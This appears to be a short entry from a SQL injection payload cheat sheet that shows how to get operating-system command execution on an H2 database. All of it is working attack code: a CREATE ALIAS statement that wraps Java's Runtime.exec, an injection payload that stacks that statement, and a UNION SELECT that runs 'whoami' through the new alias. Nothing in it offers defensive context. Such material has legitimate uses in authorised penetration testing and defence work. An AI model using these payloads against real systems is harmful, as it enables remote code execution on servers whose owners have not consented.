## Execute OS Command
### H2 Database
```SQL
CREATE ALIAS EXEC_OS_COMMAND AS '  
String exec(String cmd) throws Exception {  
Process process = Runtime.getRuntime().exec(cmd);  
Scanner scanner = new Scanner(process.getInputStream()).useDelimiter("\\A");  
return scanner.hasNext() ? scanner.next() : "";  
}';
```

Example payload:
```SQL
a';CREATE ALIAS EXEC_OS_COMMAND AS '
String exec(String cmd) throws Exception {
    Process process = Runtime.getRuntime().exec(cmd);
    Scanner scanner = new Scanner(process.getInputStream()).useDelimiter("\\A");
    return scanner.hasNext() ? scanner.next() : "";
}';--
```

Example execution:
```SQL
a' UNION SELECT 1,2,EXEC_OS_COMMAND('whoami');--
```
